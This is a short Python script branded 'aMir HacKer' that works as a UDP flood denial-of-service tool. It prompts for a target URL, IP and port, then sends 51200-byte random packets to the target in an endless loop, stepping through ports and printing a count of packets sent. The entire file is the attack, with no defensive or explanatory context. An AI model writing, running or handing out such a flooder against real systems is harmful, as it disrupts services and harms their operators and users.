import os
import socket
import random
print('                            aMir HacKer')
print('__________________________________________________________________')
print('')
print('')
url = input("ENTER WEB URL: ")
print('__________________________________________________________________')
print('')
print('')
ip = input("ENTER IP: ")
print('__________________________________________________________________')
print('')
print('')
port = int(input("ENTER PORT: "))
print('__________________________________________________________________')
print('')
print('')
yes = input("ARE YOU START:) Y/N: ")
test = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(51200)
ip = ip
ipp = socket.gethostbyname(url)
port = port
sent = 0
if yes == "Y" or yes == "y":
    while True:
      test.sendto(bytes, (ip, port))
      sent = sent +1
      port = port+1
      Send = (sent, ip, port)
      print ("SENT Packet", Send)
